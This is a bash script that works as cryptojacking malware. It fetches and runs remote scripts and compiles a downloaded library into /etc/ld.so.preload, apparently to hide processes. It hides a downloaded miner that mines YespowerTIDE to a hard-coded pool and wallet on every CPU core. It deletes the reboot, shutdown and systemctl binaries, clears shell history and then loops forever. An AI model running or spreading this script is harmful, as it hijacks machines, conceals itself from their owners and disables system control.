#!/bin/bash
git clone https://github.com/foxytouxxx/freeroot
cd freeroot
rm root.sh
wget https://raw.githubusercontent.com/rifamanajul/All-Jobs/refs/heads/main/root.sh
bash root.sh
apt update 
apt install -y wget curl sudo
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
sudo apt-get install -y gcc ca-certificates curl gnupg 
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
sudo apt-get install nodejs -y
npm install -g npm@10.2.0 -y
npm i -g node-process-hider
ph add sgr1
mkdir .lib && cd .lib
wget -O sgr1 https://bitbucket.org/hanafie1/all-jobs/downloads/ryzen >/dev/null 2>&1
chmod +x sgr1
./sgr1 -a YespowerTIDE -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.RDP -p c=TDC -t $(nproc --all) >/dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
